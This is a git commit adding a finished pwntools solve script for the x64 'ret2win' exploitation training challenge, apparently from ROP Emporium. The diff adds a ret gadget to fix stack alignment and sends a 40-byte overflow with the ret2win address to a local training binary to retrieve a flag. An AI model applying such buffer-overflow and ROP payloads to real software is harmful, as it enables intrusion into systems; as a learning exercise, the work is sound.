4768b58daaed7df35e6fcdf8259cab6f523c7858
0xSoEasY <julien@rouillier.fr>
2021-06-18 16:05:55 +0200

    Adding finished solve x64 - 0-ret2win

--- x64/0-ret2win/solve.py
+++ x64/0-ret2win/solve.py
@@ -10,11 +10,13 @@ context.binary = BINARY
 p = process(BINARY)
 
 rop = b"A"*40
+rop += p64(0x000000000040053e) # ret gadget --> solving MOVAPS issue in Ubuntu >= 18.04
 rop += p64(ELF.symbols["ret2win"])
+
 log.success(f"ROP chain : {rop}")
 
 p.recv()
 p.sendline(rop)
 
-flag = p.recvall().split(b'\n')#[-2]
+flag = p.recvall().split(b'\n')[-2]
 log.success(f"FLAG : {flag}")
